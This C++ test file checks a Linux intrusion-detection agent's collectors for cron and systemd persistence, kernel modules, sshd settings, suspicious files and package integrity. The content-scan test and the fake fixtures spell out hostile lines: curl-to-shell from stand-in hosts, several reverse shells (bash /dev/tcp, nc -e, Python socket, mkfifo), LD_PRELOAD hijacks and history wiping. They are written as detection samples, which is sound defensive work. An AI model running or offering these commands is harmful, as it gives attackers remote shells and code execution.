#include <catch2/catch.hpp>

#include "collectors/content_scan.h"
#include "collectors/file_collector.h"
#include "collectors/integrity_collector.h"
#include "collectors/packages_collector.h"
#include "collectors/persistence_collector.h"
#include "collectors/system_collector.h"
#include "fake_transport.h"

using namespace agent;

namespace {

const Observation* find(const CollectOutput& o, const std::string& type, const std::string& key_part = "") {
  for (const auto& ob : o.observations) if (ob.type == type && ob.key.find(key_part) != std::string::npos) return &ob;
  return nullptr;
}
bool tagged(const Observation* o, const std::string& t) { return o && std::find(o->tags.begin(), o->tags.end(), t) != o->tags.end(); }
bool has(const std::vector<std::string>& v, const std::string& s) { return std::find(v.begin(), v.end(), s) != v.end(); }

FileInfo mode(uint32_t m, uint32_t uid = 0) {
  FileInfo i;
  i.mode = m;
  i.uid = uid;
  return i;
}

}  // namespace

TEST_CASE("content scan: bad idioms are found, ordinary scripts are not") {
  auto t = [](const std::string& s) { return suspiciousContentTags(s); };
  REQUIRE(has(t("curl -s http://evil.example/x.sh | sh"), "pipe_to_shell"));
  REQUIRE(has(t("wget -qO- http://e/x | bash"), "pipe_to_shell"));
  REQUIRE(has(t("echo aGk= | base64 -d | sh"), "base64_exec"));
  REQUIRE(has(t("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"), "reverse_shell"));
  REQUIRE(has(t("nc -e /bin/sh 203.0.113.9 4444"), "reverse_shell"));
  REQUIRE(has(t("python3 -c 'import socket,os;s=socket.socket();s.connect((\"1.2.3.4\",1));os.dup2(s.fileno(),0)'"), "reverse_shell"));
  REQUIRE(has(t("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 1 > /tmp/f"), "reverse_shell"));
  REQUIRE(has(t("export LD_PRELOAD=/tmp/evil.so"), "ld_preload"));
  REQUIRE(has(t("export HISTFILE=/dev/null"), "anti_forensics"));
  REQUIRE(has(t("alias sudo='/tmp/fakesudo'"), "alias_hijack"));
  REQUIRE(has(t("/tmp/.x/run &"), "volatile_dir_reference"));

  REQUIRE(t("").empty());
  REQUIRE(t("# curl http://x | sh   (a comment does not run)").empty());
  REQUIRE(t("#!/bin/sh\nset -e\nrun-parts --report /etc/cron.hourly\n").empty());
  REQUIRE(t("test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )").empty());
  REQUIRE(t("export PATH=/usr/local/bin:$PATH\nexport EDITOR=vim\nalias ll='ls -la'\n").empty());
  REQUIRE(t("[ -f ~/.bash_aliases ] && . ~/.bash_aliases").empty());
  REQUIRE(t("curl -fsS https://example.com/health > /dev/null").empty());  // downloading is not piping into a shell
  REQUIRE(t("find /tmp -mtime +7 -delete").empty());                       // housekeeping that merely mentions /tmp

  REQUIRE(inVolatileDir("/tmp/x"));
  REQUIRE(inVolatileDir("/dev/shm/a"));
  REQUIRE_FALSE(inVolatileDir("/tmpfoo/x"));
  REQUIRE(inSystemBinaryDir("/usr/bin/ls"));
  REQUIRE_FALSE(inSystemBinaryDir("/opt/app/bin/x"));
}

TEST_CASE("crontab and unit file parsers") {
  const auto sys = parseCrontab(
      "# comment\nSHELL=/bin/sh\nPATH=/usr/bin\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n@reboot www-data /tmp/.x/start.sh --flag\n* * * *\n", true);
  REQUIRE(sys.size() == 2);
  REQUIRE(sys[0].schedule == "17 * * * *");
  REQUIRE(sys[0].user == "root");
  REQUIRE(sys[0].command == "cd / && run-parts --report /etc/cron.hourly");
  REQUIRE(sys[1].schedule == "@reboot");
  REQUIRE(sys[1].command == "/tmp/.x/start.sh --flag");
  const auto user = parseCrontab("*/5 * * * * /usr/bin/backup --now\n@daily  /bin/true\n", false);
  REQUIRE(user.size() == 2);
  REQUIRE(user[0].user.empty());
  REQUIRE(user[0].command == "/usr/bin/backup --now");
  REQUIRE(user[1].command == "/bin/true");

  const auto u = parseUnitFile(
      "[Unit]\nDescription=Backup job\n\n[Service]\nType=oneshot\nUser=backup\nExecStart=/usr/local/bin/backup.sh --full\nExecStartPre=-/bin/true\n\n"
      "[Install]\nWantedBy=multi-user.target timers.target\n[Timer]\nOnCalendar=daily\n[Socket]\nListenStream=0.0.0.0:2222\n");
  REQUIRE(u.description == "Backup job");
  REQUIRE(u.user == "backup");
  REQUIRE(u.exec.size() == 2);
  REQUIRE(u.exec[0] == "ExecStart=/usr/local/bin/backup.sh --full");
  REQUIRE(u.wanted_by == std::vector<std::string>{"multi-user.target", "timers.target"});
  REQUIRE(u.schedule == "OnCalendar=daily");
  REQUIRE(u.listen == "0.0.0.0:2222");
}

TEST_CASE("PersistenceCollector finds the places an intruder leaves things") {
  FakeTransport t;
  t.files["/etc/crontab"] = "17 * * * * root run-parts /etc/cron.hourly\n";
  t.files["/etc/ld.so.preload"] = "/lib/x86_64-linux-gnu/libevil.so\n";
  t.files["/etc/profile"] = "export PATH=$PATH\n";
  t.files["/etc/environment"] = "PATH=/usr/bin\nLD_PRELOAD=/tmp/x.so\n";
  t.dirs["/etc/cron.d"] = {"backup", "evil"};
  t.files["/etc/cron.d/backup"] = "30 2 * * * root /usr/local/bin/backup.sh\n";
  t.files["/etc/cron.d/evil"] = "@reboot root curl http://203.0.113.9/x.sh | sh\n* * * * * root /tmp/.k/run\n";
  t.dirs["/etc/cron.daily"] = {"logrotate"};
  t.files["/etc/cron.daily/logrotate"] = "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n";
  t.dirs["/etc/systemd/system"] = {"good.service", "bad.service", "multi-user.target.wants", "alias.service"};
  t.dirs["/etc/systemd/system/multi-user.target.wants"] = {"bad.service", "good.service"};
  t.files["/etc/systemd/system/good.service"] = "[Service]\nExecStart=/usr/bin/good\n[Install]\nWantedBy=multi-user.target\n";
  t.files["/etc/systemd/system/bad.service"] = "[Unit]\nDescription=Updater\n[Service]\nExecStart=/tmp/.updater --silent\nRestart=always\n[Install]\nWantedBy=multi-user.target\n";
  t.files["/etc/systemd/system/alias.service"] = "[Service]\nExecStart=/usr/bin/x\n";
  t.links["/etc/systemd/system/alias.service"] = "/lib/systemd/system/x.service";
  t.files["/etc/passwd"] = "root:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\nwww:x:33:33::/var/www:/usr/sbin/nologin\n";
  t.files["/home/bob/.bashrc"] = "alias ll='ls -la'\nexport LD_PRELOAD=/tmp/hook.so\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1 &\n";
  t.files["/home/bob/.profile"] = "export EDITOR=vim\n";
  t.files["/root/.bashrc"] = "# nothing\n";
  t.dirs["/var/spool/cron/crontabs"] = {"bob"};
  t.files["/var/spool/cron/crontabs/bob"] = "*/10 * * * * /home/bob/sync.sh\n";

  PersistenceCollector c;
  auto r = c.collect(t);
  REQUIRE(r.ok());
  const auto& o = r.value();

  const auto* reboot = find(o, "cron.entry", "@reboot");
  REQUIRE(reboot);
  REQUIRE(tagged(reboot, "reboot"));
  REQUIRE(tagged(reboot, "pipe_to_shell"));
  const auto* vol = find(o, "cron.entry", "/tmp/.k/run");
  REQUIRE(vol);
  REQUIRE(tagged(vol, "command_in_volatile_dir"));
  const auto* ok = find(o, "cron.entry", "backup.sh");
  REQUIRE(ok);
  REQUIRE(ok->tags.empty());
  REQUIRE(find(o, "cron.entry", "/etc/crontab|17"));
  const auto* usercron = find(o, "cron.entry", "sync.sh");
  REQUIRE(usercron);
  REQUIRE(usercron->data["user"] == "bob");
  REQUIRE(usercron->data["owner_crontab"] == true);

  const auto* script = find(o, "cron.script", "logrotate");
  REQUIRE(script);
  REQUIRE(script->data["sha256"].get<std::string>().size() == 64);
  REQUIRE(script->tags.empty());

  const auto* bad = find(o, "systemd.unit", "bad.service");
  REQUIRE(bad);
  REQUIRE(tagged(bad, "exec_in_volatile_dir"));
  REQUIRE(tagged(bad, "admin_unit"));
  REQUIRE(bad->data["description"] == "Updater");
  const auto* good = find(o, "systemd.unit", "good.service");
  REQUIRE(good);
  REQUIRE_FALSE(tagged(good, "exec_in_volatile_dir"));
  const auto* alias = find(o, "systemd.unit", "alias.service");
  REQUIRE(alias);
  REQUIRE_FALSE(tagged(alias, "admin_unit"));  // an alias to a packaged unit
  REQUIRE(alias->data["link_target"] == "/lib/systemd/system/x.service");
  REQUIRE(find(o, "systemd.enabled", "multi-user.target.wants/bad.service"));

  const auto* pre = find(o, "preload.entry");
  REQUIRE(pre);
  REQUIRE(tagged(pre, "ld_so_preload"));
  const auto* env = find(o, "startup.file", "/etc/environment");
  REQUIRE(env);
  REQUIRE(tagged(env, "ld_preload"));
  const auto* rc = find(o, "startup.file", "/home/bob/.bashrc");
  REQUIRE(rc);
  REQUIRE(tagged(rc, "reverse_shell"));
  REQUIRE(tagged(rc, "ld_preload"));
  const auto* prof = find(o, "startup.file", "/home/bob/.profile");
  REQUIRE(prof);
  REQUIRE(prof->tags.empty());
  REQUIRE(find(o, "startup.file", "/etc/profile")->tags.empty());
}

TEST_CASE("system state parsers") {
  const auto m = parseModules("nf_tables 286720 142 nft_chain_nat,nft_ct, Live 0x0000000000000000\nevil 12288 0 - Live 0x0000000000000000 (OE)\nlone 4096 1 - Live 0x0\n");
  REQUIRE(m.size() == 3);
  REQUIRE(m[0].name == "nf_tables");
  REQUIRE(m[0].refcount == 142);
  REQUIRE(m[0].used_by == std::vector<std::string>{"nft_chain_nat", "nft_ct"});
  REQUIRE(m[1].taint == "OE");
  REQUIRE(m[1].used_by.empty());
  REQUIRE(taintLetters(0) == "");
  REQUIRE(taintLetters((1u << 12) | (1u << 13)) == "OE");
  REQUIRE(taintLetters(1) == "P");

  const auto mounts = parseMounts("/dev/sda1 / ext4 rw,relatime 0 0\ntmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0\nserver:/x /mnt/my\\040data nfs4 rw 0 0\n");
  REQUIRE(mounts.size() == 3);
  REQUIRE(mounts[1].options == std::vector<std::string>{"rw", "nosuid", "nodev"});
  REQUIRE(mounts[2].mountpoint == "/mnt/my data");

  const auto sshd = parseSshdConfig("# c\nPort 22\nPermitRootLogin yes\nPasswordAuthentication   no\nPermitRootLogin no\nMatch User bob\n  PasswordAuthentication yes\n");
  REQUIRE(sshd.size() == 5);  // global part only: stops at Match
  REQUIRE(sshd[1].name == "permitrootlogin");
  REQUIRE(sshd[1].value == "yes");
  REQUIRE(sshd[4].name == "match");
}

TEST_CASE("SystemCollector") {
  FakeTransport t;
  t.files["/proc/modules"] = "ext4 1000 1 - Live 0x0\nrootkit 4096 0 - Live 0x0 (OE)\n";
  t.files["/proc/sys/kernel/tainted"] = "12288\n";
  t.files["/proc/sys/kernel/randomize_va_space"] = "0\n";
  t.files["/proc/sys/kernel/kptr_restrict"] = "1\n";
  t.files["/proc/sys/net/ipv4/ip_forward"] = "1\n";
  t.files["/proc/sys/kernel/yama/ptrace_scope"] = "0\n";
  t.files["/proc/mounts"] = "/dev/sda1 / ext4 rw 0 0\ntmpfs /tmp tmpfs rw,nosuid 0 0\ntmpfs /dev/shm tmpfs rw,noexec 0 0\ntmpfs /run/user/1000 tmpfs rw 0 0\nproc /proc proc rw 0 0\n";
  t.files["/etc/resolv.conf"] = "nameserver 10.0.0.2\nnameserver 203.0.113.53\nsearch example.com\n";
  t.files["/etc/hosts"] = "127.0.0.1 localhost\n203.0.113.9 update.example.com updates # redirected\n";
  t.files["/etc/ssh/sshd_config"] = "PermitRootLogin yes\nPasswordAuthentication no\nPermitEmptyPasswords yes\nX11Forwarding yes\n";
  t.dirs["/etc/ssh/sshd_config.d"] = {"10-local.conf", "README"};
  t.files["/etc/ssh/sshd_config.d/10-local.conf"] = "PasswordAuthentication yes\nPermitRootLogin no\n";
  t.dirs["/sys/class/net"] = {"lo", "eth0", "docker0"};
  t.files["/sys/class/net/lo/flags"] = "0x9\n";
  t.files["/sys/class/net/eth0/flags"] = "0x1103\n";   // up + promisc
  t.files["/sys/class/net/docker0/flags"] = "0x1003\n";
  t.dirs["/dev"] = {"null", "sda", "evil.bin", "pts", "stdin", "mem"};
  t.dirs["/dev/pts"] = {};
  t.dirs["/dev/shm"] = {".hidden", "app.shm"};
  t.infos["/dev/null"] = mode(020666);
  t.infos["/dev/sda"] = mode(060660);
  t.infos["/dev/evil.bin"] = mode(0100755);
  t.infos["/dev/stdin"] = mode(0120777);
  t.infos["/dev/mem"] = mode(020666);
  t.infos["/dev/shm/.hidden"] = mode(0100755);
  t.infos["/dev/shm/app.shm"] = mode(0100600);

  SystemCollector c;
  auto r = c.collect(t);
  REQUIRE(r.ok());
  const auto& o = r.value();

  REQUIRE(find(o, "kernel.module", "ext4")->tags.empty());
  const auto* rk = find(o, "kernel.module", "rootkit");
  REQUIRE(tagged(rk, "module_unsigned"));
  REQUIRE(tagged(rk, "module_out_of_tree"));
  const auto* taint = find(o, "kernel.taint");
  REQUIRE(taint);
  REQUIRE(taint->data["flags"] == "OE");
  REQUIRE(tagged(taint, "unsigned_module"));

  REQUIRE(tagged(find(o, "sysctl.value", "randomize_va_space"), "weak_setting"));
  REQUIRE_FALSE(tagged(find(o, "sysctl.value", "kptr_restrict"), "weak_setting"));
  REQUIRE(tagged(find(o, "sysctl.value", "ip_forward"), "weak_setting"));
  REQUIRE(tagged(find(o, "sysctl.value", "ptrace_scope"), "weak_setting"));
  REQUIRE_FALSE(find(o, "sysctl.value", "tcp_syncookies"));  // not readable here: simply absent

  REQUIRE(tagged(find(o, "mount.entry", "/tmp|tmpfs"), "exec_allowed_in_tmp"));
  REQUIRE_FALSE(tagged(find(o, "mount.entry", "/dev/shm"), "exec_allowed_in_tmp"));
  REQUIRE(find(o, "mount.entry", "/|ext4"));
  REQUIRE_FALSE(find(o, "mount.entry", "/proc"));
  REQUIRE_FALSE(find(o, "mount.entry", "/run/user"));

  REQUIRE(find(o, "net.dns", "203.0.113.53"));
  const auto* host = find(o, "net.hosts_entry", "203.0.113.9");
  REQUIRE(host);
  REQUIRE(host->data["names"] == nlohmann::json::array({"update.example.com", "updates"}));

  // drop-in wins over the main file (first value wins in sshd)
  REQUIRE(find(o, "sshd.option", "passwordauthentication=yes"));
  REQUIRE_FALSE(find(o, "sshd.option", "passwordauthentication=no"));
  REQUIRE(tagged(find(o, "sshd.option", "passwordauthentication=yes"), "password_authentication"));
  REQUIRE(find(o, "sshd.option", "permitrootlogin=no"));
  REQUIRE_FALSE(find(o, "sshd.option", "permitrootlogin=yes"));
  REQUIRE(tagged(find(o, "sshd.option", "permitemptypasswords"), "permit_empty_passwords"));

  REQUIRE(tagged(find(o, "net.iface", "eth0"), "promiscuous"));
  REQUIRE_FALSE(tagged(find(o, "net.iface", "lo"), "promiscuous"));
  REQUIRE_FALSE(tagged(find(o, "net.iface", "docker0"), "promiscuous"));

  REQUIRE(tagged(find(o, "dev.node", "/dev/evil.bin"), "regular_file_in_dev"));
  REQUIRE(tagged(find(o, "dev.node", "/dev/evil.bin"), "executable"));
  REQUIRE_FALSE(tagged(find(o, "dev.node", "/dev/null"), "world_writable_device"));  // normal
  REQUIRE(tagged(find(o, "dev.node", "/dev/mem"), "world_writable_device"));          // not normal
  REQUIRE(find(o, "dev.node", "/dev/stdin|symlink"));
  REQUIRE_FALSE(find(o, "dev.node", "/dev/pts"));  // directories are skipped
  const auto* hid = find(o, "dev.node", "/dev/shm/.hidden");
  REQUIRE(tagged(hid, "hidden_file"));
  REQUIRE(tagged(hid, "executable"));
  REQUIRE_FALSE(tagged(find(o, "dev.node", "/dev/shm/app.shm"), "regular_file_in_dev"));
}

TEST_CASE("FileCollector") {
  FakeTransport t;
  auto entry = [](char type, uint32_t mode, const std::string& user, const std::string& path, uint64_t size = 100) {
    ScanEntry e;
    e.type = type;
    e.mode = mode;
    e.user = user;
    e.group = user;
    e.size = size;
    e.mtime = 1700000000;
    e.path = path;
    return e;
  };
  t.scans["suid"] = {entry('f', 04755, "root", "/usr/bin/sudo"), entry('f', 06755, "root", "/home/bob/.cache/rootsh"), entry('f', 04755, "root", "/usr/bin/python3.10"),
                     entry('f', 02755, "root", "/usr/bin/wall")};
  t.scans["volatile"] = {entry('f', 0755, "bob", "/tmp/.x/payload"), entry('f', 0644, "bob", "/tmp/notes.txt"), entry('f', 0700, "www-data", "/dev/shm/run.sh"),
                         entry('s', 0777, "bob", "/tmp/agent.sock"), entry('l', 0777, "bob", "/tmp/link")};
  t.scans["writable"] = {entry('f', 0666, "root", "/usr/bin/tool"), entry('d', 0777, "root", "/etc/cron.weekly")};
  t.scans["localexec"] = {entry('f', 0755, "root", "/opt/app/bin/server", 5000)};
  t.files["/tmp/.x/payload"] = std::string("\x7f" "ELF\x02\x01", 6);
  t.files["/dev/shm/run.sh"] = "#!/bin/sh\necho hi\n";
  t.files["/tmp/notes.txt"] = "hello";

  t.scans["volatile"].push_back(entry('f', 0644, "bob", "/tmp/build/cache/object1.o"));  // ordinary data: counted, not listed
  t.scans["volatile"].push_back(entry('f', 0644, "bob", "/tmp/build/cache/object2.o"));
  FileCollector c;
  c.setSuidInterval(std::chrono::seconds(0));
  auto r = c.collect(t);
  REQUIRE(r.ok());
  const auto& o = r.value();
  REQUIRE_FALSE(find(o, "file.entry", "object1.o"));
  REQUIRE_FALSE(find(o, "file.entry", "notes.txt"));
  bool counted = false;
  for (const auto& w : r.value().warnings) counted |= w.find("ordinary file") != std::string::npos;
  REQUIRE(counted);

  const auto* sudo = find(o, "file.entry", "suid|/usr/bin/sudo");
  REQUIRE(tagged(sudo, "suid"));
  REQUIRE(tagged(sudo, "suid_root"));
  REQUIRE_FALSE(tagged(sudo, "outside_system_dirs"));
  REQUIRE_FALSE(tagged(sudo, "suid_gtfobin"));
  const auto* rootsh = find(o, "file.entry", "rootsh");
  REQUIRE(tagged(rootsh, "outside_system_dirs"));
  REQUIRE(tagged(rootsh, "sgid"));
  REQUIRE(tagged(find(o, "file.entry", "python3.10"), "suid_gtfobin"));  // version suffix is ignored
  REQUIRE(sudo->data["mode"] == "4755");
  REQUIRE(tagged(find(o, "file.entry", "wall"), "sgid"));

  const auto* payload = find(o, "file.entry", "volatile|/tmp/.x/payload");
  REQUIRE(tagged(payload, "executable"));
  REQUIRE(tagged(payload, "hidden"));
  REQUIRE(tagged(payload, "binary_executable_format"));
  REQUIRE(payload->data["magic"] == "elf");
  const auto* sh = find(o, "file.entry", "run.sh");
  REQUIRE(tagged(sh, "script_file"));
  REQUIRE_FALSE(tagged(find(o, "file.entry", "notes.txt"), "executable"));
  REQUIRE(tagged(find(o, "file.entry", "agent.sock"), "unix_socket"));

  REQUIRE(tagged(find(o, "file.entry", "writable|/usr/bin/tool"), "world_writable_file"));
  REQUIRE(tagged(find(o, "file.entry", "writable|/usr/bin/tool"), "in_binary_dir"));
  REQUIRE(tagged(find(o, "file.entry", "writable|/etc/cron.weekly"), "world_writable_dir"));
  REQUIRE(find(o, "file.entry", "localexec|/opt/app/bin/server"));

  // a failing scan degrades, it does not hide the others; all failing is an error
  FakeTransport partial;
  partial.scans["suid"] = {entry('f', 04755, "root", "/usr/bin/sudo")};
  FileCollector fp;
  auto rp = fp.collect(partial);
  REQUIRE(rp.ok());
  REQUIRE(rp.value().warnings.size() == 3);
  REQUIRE_FALSE(FileCollector().collect(*std::make_unique<FakeTransport>()).ok());

  // the heavy SUID walk is rationed: the second run (right after) only does the quick scans
  FakeTransport quick;
  quick.scans["suid"] = {entry('f', 04755, "root", "/usr/bin/sudo")};
  quick.scans["volatile"] = {};
  quick.scans["writable"] = {};
  quick.scans["localexec"] = {};
  FileCollector rationed;
  REQUIRE(find(rationed.collect(quick).value(), "file.entry", "suid|/usr/bin/sudo"));
  // the walk is not repeated (a new SUID file is not seen yet) but the last result is carried over,
  // so the snapshot stays complete and findings do not flap
  ScanEntry planted;
  planted.type = 'f';
  planted.mode = 04755;
  planted.user = "root";
  planted.path = "/tmp/planted";
  quick.scans["suid"].push_back(planted);
  auto again = rationed.collect(quick);
  REQUIRE(find(again.value(), "file.entry", "suid|/usr/bin/sudo"));
  REQUIRE_FALSE(find(again.value(), "file.entry", "planted"));
}

TEST_CASE("IntegrityCollector parses package verification") {
  const auto d = parsePackageVerify(
      "??5??????   /usr/bin/ls\n"
      "??5?????? c /etc/ssh/sshd_config\n"
      "missing     /usr/bin/gone\n"
      "missing   c /etc/gone.conf\n"
      ".M.......   /usr/sbin/tool\n"
      "S.5....T.   /usr/lib/x.so\n"
      "dpkg: warning: something\n");
  REQUIRE(d.size() == 6);
  REQUIRE(d[0].path == "/usr/bin/ls");
  REQUIRE_FALSE(d[0].config);
  REQUIRE(d[1].config);
  REQUIRE(d[2].flags == "missing");
  REQUIRE(d[3].config);
  REQUIRE(d[5].path == "/usr/lib/x.so");

  FakeTransport t;
  t.files["/usr/bin/dpkg"] = "";
  CommandResult cr;
  cr.exit_code = 1;
  cr.out = "??5??????   /usr/bin/ls\n??5?????? c /etc/ssh/sshd_config\n.M.......   /usr/bin/ssh\nmissing     /usr/bin/gone\n??5??????   /usr/share/doc/x/README\n";
  t.commands["dpkg -V"] = cr;
  auto r = IntegrityCollector().collect(t);
  REQUIRE(r.ok());
  REQUIRE(r.value().observations.size() == 5);
  REQUIRE(r.value().observations[0].tags.size() >= 2);  // the dangerous ones sort first
  const auto* ls = find(r.value(), "pkg.verify", "/usr/bin/ls");
  REQUIRE(tagged(ls, "content_changed"));
  REQUIRE(tagged(ls, "system_binary_modified"));
  const auto* cfg = find(r.value(), "pkg.verify", "sshd_config");
  REQUIRE(tagged(cfg, "config_file"));
  REQUIRE_FALSE(tagged(cfg, "system_binary_modified"));
  REQUIRE(tagged(find(r.value(), "pkg.verify", "/usr/bin/ssh"), "permissions_changed"));
  REQUIRE(tagged(find(r.value(), "pkg.verify", "/usr/bin/gone"), "missing"));
  REQUIRE(tagged(find(r.value(), "pkg.verify", "/usr/bin/gone"), "system_file_missing"));
  REQUIRE_FALSE(tagged(find(r.value(), "pkg.verify", "/usr/bin/gone"), "system_binary_modified"));  // missing is not "modified"
  REQUIRE_FALSE(tagged(find(r.value(), "pkg.verify", "README"), "system_binary_modified"));  // docs are not binaries

  FakeTransport rpm;
  rpm.files["/usr/bin/rpm"] = "";
  CommandResult rc;
  rc.out = "S.5....T.  c /etc/passwd\n";
  rpm.commands["rpm -Va"] = rc;
  REQUIRE(IntegrityCollector().collect(rpm).ok());

  FakeTransport none;
  REQUIRE_FALSE(IntegrityCollector().collect(none).ok());

  FakeTransport failing;
  failing.files["/usr/bin/dpkg"] = "";
  CommandResult bad;
  bad.exit_code = 2;
  bad.err = "dpkg: error";
  failing.commands["dpkg -V"] = bad;
  REQUIRE_FALSE(IntegrityCollector().collect(failing).ok());
}

TEST_CASE("packages: dpkg status, rpm list, os-release, kernel") {
  const auto d = parseDpkgStatus(
      "Package: openssl\nStatus: install ok installed\nPriority: optional\nArchitecture: amd64\nVersion: 3.0.2-0ubuntu1.12\nDescription: Secure Sockets Layer toolkit\n"
      " continuation line: not a field\n\n"
      "Package: libssl3\nStatus: install ok installed\nArchitecture: amd64\nSource: openssl (3.0.2-0ubuntu1.12)\nVersion: 3.0.2-0ubuntu1.12+b1\n\n"
      "Package: gone\nStatus: deinstall ok config-files\nVersion: 1.0\nArchitecture: all\n\n"
      "Package: held\nStatus: hold ok installed\nVersion: 2.0\nArchitecture: all\n\n"
      "Package: bash\nStatus: install ok installed\nVersion: 5.1-6ubuntu1\nArchitecture: amd64\nSource: bash\n");
  REQUIRE(d.size() == 4);  // "deinstall ok config-files" is gone; "hold ok installed" is installed (just frozen)
  REQUIRE(d[0].name == "openssl");
  REQUIRE(d[0].source == "openssl");  // no Source field: the binary is its own source
  REQUIRE(d[1].name == "libssl3");
  REQUIRE(d[1].source == "openssl");
  REQUIRE(d[1].source_version == "3.0.2-0ubuntu1.12");  // source version differs from the binNMU version
  REQUIRE(d[1].version == "3.0.2-0ubuntu1.12+b1");
  REQUIRE(d[2].name == "held");
  REQUIRE(d[3].source == "bash");

  const auto r = parseRpmList("openssl-libs-3.0.7-24.el9.x86_64\nkernel-core-5.14.0-362.8.1.el9_3.x86_64\ngpg-pubkey-abc-123\nbash-5.1.8-6.el9_1.x86_64\nbad line\n");
  REQUIRE(r.size() == 3);
  REQUIRE(r[0].name == "openssl-libs");
  REQUIRE(r[0].version == "3.0.7-24.el9");
  REQUIRE(r[0].arch == "x86_64");
  REQUIRE(r[1].name == "kernel-core");

  const auto os = parseOsRelease("PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nID=ubuntu\nID_LIKE=debian\nVERSION_CODENAME=jammy\n");
  REQUIRE(os.id == "ubuntu");
  REQUIRE(os.version_id == "22.04");
  REQUIRE(os.codename == "jammy");
  REQUIRE(os.id_like == "debian");
  REQUIRE(os.pretty_name == "Ubuntu 22.04.3 LTS");

  REQUIRE(kernelUpstreamVersion("5.15.0-91-generic") == "5.15.0");
  REQUIRE(kernelUpstreamVersion("6.8.0-138-generic") == "6.8.0");
  REQUIRE(kernelUpstreamVersion("5.14.0-362.8.1.el9_3.x86_64") == "5.14.0");
  REQUIRE(kernelUpstreamVersion("6.1.0") == "6.1.0");
}

TEST_CASE("PackagesCollector") {
  FakeTransport t;
  t.files["/etc/os-release"] = "ID=debian\nVERSION_ID=\"12\"\nVERSION_CODENAME=bookworm\n";
  t.files["/proc/sys/kernel/osrelease"] = "6.1.0-18-amd64\n";
  t.files["/var/lib/dpkg/status"] = "Package: curl\nStatus: install ok installed\nArchitecture: amd64\nVersion: 7.88.1-10+deb12u5\n\n";
  auto r = PackagesCollector().collect(t);
  REQUIRE(r.ok());
  REQUIRE(find(r.value(), "os.release")->data["codename"] == "bookworm");
  REQUIRE(find(r.value(), "os.kernel")->data["upstream"] == "6.1.0");
  const auto* curl = find(r.value(), "pkg.installed", "curl:amd64");
  REQUIRE(curl);
  REQUIRE(curl->data["version"] == "7.88.1-10+deb12u5");

  FakeTransport rpm;
  rpm.files["/etc/os-release"] = "ID=rocky\nVERSION_ID=\"9.3\"\n";
  CommandResult cr;
  cr.out = "bash-5.1.8-6.el9_1.x86_64\n";
  rpm.commands["rpm -qa"] = cr;
  auto rr = PackagesCollector().collect(rpm);
  REQUIRE(rr.ok());
  REQUIRE(find(rr.value(), "pkg.installed", "bash:x86_64"));

  FakeTransport none;
  REQUIRE_FALSE(PackagesCollector().collect(none).ok());
}
